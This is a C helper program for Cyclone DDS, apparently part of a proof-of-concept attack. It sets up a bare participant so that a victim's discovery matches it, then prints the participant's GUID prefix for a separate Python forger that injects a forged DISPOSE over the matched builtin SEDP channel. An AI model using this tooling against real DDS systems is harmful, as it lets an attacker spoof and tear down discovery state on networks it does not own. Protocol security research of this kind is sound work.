/* injector_presence -- the roadmap's "hybrid" carrier for Module 1. A real, bare
 * Cyclone participant with NO user endpoints. Its only job is to be legitimately
 * discovered so the victim consumer creates a matched proxy for THIS participant's
 * builtin SEDP publications writer (entityid 0x3c2), with the reliable channel and
 * ports established by Cyclone. The one forged keyed DISPOSE is then injected on
 * that already-matched 0x3c2 by the Python forger, sidestepping a from-scratch
 * SPDP/port/reliability reimplementation (wiki flags the full handshake as the
 * hard part). Prints its own participant GUID prefix for the forger. */
#include "dds/dds.h"
#include <stdio.h>
#include <signal.h>
#include <unistd.h>

static volatile sig_atomic_t stop = 0;
static void on_sig(int s){ (void)s; stop = 1; }

int main(void){
  signal(SIGINT,on_sig); signal(SIGTERM,on_sig);
  dds_entity_t dp = dds_create_participant(DDS_DOMAIN_DEFAULT, NULL, NULL);
  if (dp<0){ fprintf(stderr,"participant: %s\n", dds_strretcode(-dp)); return 1; }
  dds_guid_t g;
  if (dds_get_guid(dp,&g)==DDS_RETCODE_OK){
    printf("INJECTOR_PREFIX ");
    for(int i=0;i<12;i++) printf("%02x", g.v[i]);   /* 12-byte guidPrefix */
    printf("\n");
  }
  printf("injector_presence up: bare participant, no user endpoints\n");
  fflush(stdout);
  while(!stop) sleep(1);
  dds_delete(dp);
  return 0;
}
